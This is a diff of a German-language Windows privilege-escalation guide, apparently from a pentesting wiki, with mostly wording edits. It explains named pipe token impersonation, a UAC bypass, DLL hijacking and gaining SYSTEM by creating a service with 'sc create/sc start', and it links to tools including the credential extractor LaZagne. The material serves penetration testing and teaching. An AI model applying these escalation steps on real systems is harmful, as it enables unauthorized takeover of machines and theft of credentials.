+Wenn Daten durch eine Pipe von einem **Client** gesendet werden, hat der **Server**, der die Pipe eingerichtet hat, die Möglichkeit, die **Identität** des **Clients** zu **übernehmen**, vorausgesetzt, er hat die erforderlichen **SeImpersonate**-Rechte. Die Identifizierung eines **privilegierten Prozesses**, der über eine Pipe kommuniziert und den Sie nachahmen können, bietet die Möglichkeit, **höhere Berechtigungen zu erlangen**, indem Sie die Identität dieses Prozesses übernehmen, sobald er mit der von Ihnen eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs finden Sie [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).
 
 Außerdem ermöglicht das folgende Tool, **eine Named Pipe-Kommunikation mit einem Tool wie Burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool ermöglicht es, alle Pipes aufzulisten und zu sehen, um Privilegien zu erlangen** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
@@ -1255,7 +1268,7 @@ Compare-Object -ReferenceObject $process -DifferenceObject $process2
 
 Wenn Sie Zugriff auf die grafische Benutzeroberfläche (über Konsole oder RDP) haben und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder einen anderen Prozess wie "NT\AUTHORITY SYSTEM" von einem unprivilegierten Benutzer auszuführen.
 
-Dies ermöglicht es, die Berechtigungen zu eskalieren und UAC gleichzeitig mit derselben Schwachstelle zu umgehen. Darüber hinaus ist es nicht erforderlich, etwas zu installieren, und die während des Prozesses verwendete Binärdatei ist signiert und von Microsoft herausgegeben.
+Dies ermöglicht es, die Berechtigungen zu eskalieren und UAC gleichzeitig mit derselben Schwachstelle zu umgehen. Darüber hinaus ist es nicht erforderlich, etwas zu installieren, und die während des Prozesses verwendete Binärdatei ist von Microsoft signiert und herausgegeben.
 
 Einige der betroffenen Systeme sind die folgenden:
 ```
@@ -1315,11 +1328,11 @@ Lesen Sie dann **dies, um über UAC und UAC-Umgehungen zu lernen:**
 ../authentication-credentials-uac-and-efs/uac-user-account-control.md
 {{#endref}}
 
-## **Vom hohen Integritätslevel zum System**
+## **Von hoher Integrität zum System**
 
 ### **Neuer Dienst**
 
-Wenn Sie bereits auf einem hohen Integritätsprozess laufen, kann der **Übergang zu SYSTEM** einfach sein, indem Sie **einen neuen Dienst erstellen und ausführen**:
+Wenn Sie bereits auf einem Prozess mit hoher Integrität laufen, kann der **Übergang zu SYSTEM** einfach sein, indem Sie **einen neuen Dienst erstellen und ausführen**:
 ```
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
@@ -1342,12 +1355,12 @@ Mit dieser Technik wird normalerweise **ein beliebiger Prozess, der als SYSTEM a
 ### **Named Pipes**
 
 Diese Technik wird von Meterpreter verwendet, um in `getsystem` zu eskalieren. Die Technik besteht darin, **ein Pipe zu erstellen und dann einen Dienst zu erstellen/auszunutzen, um auf dieses Pipe zu schreiben**. Dann kann der **Server**, der das Pipe mit der **`SeImpersonate`**-Berechtigung erstellt hat, das **Token** des Pipe-Clients (des Dienstes) **nachahmen** und SYSTEM-Berechtigungen erhalten.\
-Wenn Sie [**mehr über benannte Pipes erfahren möchten, sollten Sie dies lesen**](#named-pipe-client-impersonation).\
-Wenn Sie ein Beispiel lesen möchten, [**wie man von hoher Integrität zu System mit benannten Pipes gelangt, sollten Sie dies lesen**](from-high-integrity-to-system-with-name-pipes.md).
+Wenn Sie [**mehr über Namens-Pipes erfahren möchten, sollten Sie dies lesen**](#named-pipe-client-impersonation).\
+Wenn Sie ein Beispiel lesen möchten, [**wie man von hoher Integrität zu System mit Namens-Pipes gelangt, sollten Sie dies lesen**](from-high-integrity-to-system-with-name-pipes.md).
 
 ### Dll Hijacking
 
-Wenn es Ihnen gelingt, eine **dll** zu **hijacken**, die von einem **Prozess** ausgeführt wird, der als **SYSTEM** läuft, können Sie beliebigen Code mit diesen Berechtigungen ausführen. Daher ist Dll Hijacking auch nützlich für diese Art der Privilegieneskalation und zudem **viel einfacher von einem High Integrity-Prozess aus zu erreichen**, da er **Schreibberechtigungen** für die Ordner hat, die zum Laden von DLLs verwendet werden.\
+Wenn Sie es schaffen, eine **dll** zu **hijacken**, die von einem **Prozess** ausgeführt wird, der als **SYSTEM** läuft, können Sie beliebigen Code mit diesen Berechtigungen ausführen. Daher ist Dll Hijacking auch nützlich für diese Art der Privilegieneskalation und zudem **viel einfacher von einem High Integrity-Prozess aus zu erreichen**, da er **Schreibberechtigungen** für die Ordner hat, die zum Laden von DLLs verwendet werden.\
 **Sie können** [**hier mehr über Dll Hijacking erfahren**](dll-hijacking/index.html)**.**
 
 ### **Von Administrator oder Netzwerkdienst zu System**
@@ -1360,13 +1373,13 @@ https://github.com/sailay1996/RpcSsImpersonator
 
 **Lesen:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
 
-## Weitere Hilfe
+## Mehr Hilfe
 
 [Statische Impacket-Binärdateien](https://github.com/ropnop/impacket_static_binaries)
 
 ## Nützliche Werkzeuge
 
-**Das beste Tool, um nach Windows-Privilegieneskalationsvektoren zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+**Bestes Tool zur Suche nach Windows-Privilegieneskalationsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
 **PS**
 
@@ -1388,12 +1401,12 @@ https://github.com/sailay1996/RpcSsImpersonator
 [**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (mehr ein Informationssammlungswerkzeug als Privilegieneskalation) (muss kompiliert werden) **(**[**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
 [**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Anmeldeinformationen aus vielen Softwareanwendungen (vorkompilierte exe in github)**\
 [**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port von PowerUp nach C#**\
-[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Überprüfen Sie auf Fehlkonfigurationen (ausführbare Datei vorkompiliert in github). Nicht empfohlen. Funktioniert nicht gut in Win10.\
+[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Überprüfen Sie auf Fehlkonfigurationen (ausführbare vorkompilierte Datei in github). Nicht empfohlen. Funktioniert nicht gut in Win10.\
 [~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Überprüfen Sie auf mögliche Fehlkonfigurationen (exe aus python). Nicht empfohlen. Funktioniert nicht gut in Win10.
 
 **Bat**
 
-[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf diesem Beitrag basiert (es benötigt keinen accesschk, um ordnungsgemäß zu funktionieren, kann es aber verwenden).
+[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf diesem Beitrag basiert (es benötigt keinen accesschk, um ordnungsgemäß zu funktionieren, kann ihn aber verwenden).
 
 **Local**
 
